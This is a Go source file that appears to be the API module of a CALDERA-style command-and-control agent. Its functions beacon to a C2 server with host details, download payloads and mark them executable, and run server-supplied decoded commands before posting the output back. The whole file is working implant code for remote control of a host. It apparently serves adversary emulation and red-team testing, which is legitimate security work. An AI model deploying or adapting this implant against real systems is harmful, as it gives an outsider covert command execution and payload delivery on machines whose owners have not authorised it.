package api

import (
	"bytes"
	"fmt"
	"net/http"
	"runtime"
	"io/ioutil"
	"time"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"../util"
	"../execute"
)

// Beacon is a single call to the C2
func Beacon(server string, paw string, group string, files string) interface{} {
	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "group": group, "files": files})
	address := fmt.Sprintf("%s/sand/beacon", server)
	bites := request(address, paw, data)
	var out interface{}
	json.Unmarshal(bites, &out)
	return out
}

// Drop a file from CALDERA
func Drop(server string, files string, command map[string]interface{}) {
	payload := command["payload"].(string)
	location := filepath.Join(files, payload)
	if len(payload) > 0 && util.Exists(location) == false {
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil {
			dst, _ := os.Create(location) 
			defer dst.Close()
			_, _ = io.Copy(dst, resp.Body)
			os.Chmod(location, 0500)
		}
	}
}

// Results executes a command and posts results to CALDERA
func Results(server string, paw string, command map[string]interface{}) {
	cmd := string(util.Decode(command["command"].(string)))
	status := "0"
	result, err := execute.Execute(cmd)
	if err != nil {
		status = "1"
	}
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command["id"].(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, paw, data)
	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
}

func request(address string, paw string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	req.Header.Set("X-PAW", paw)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
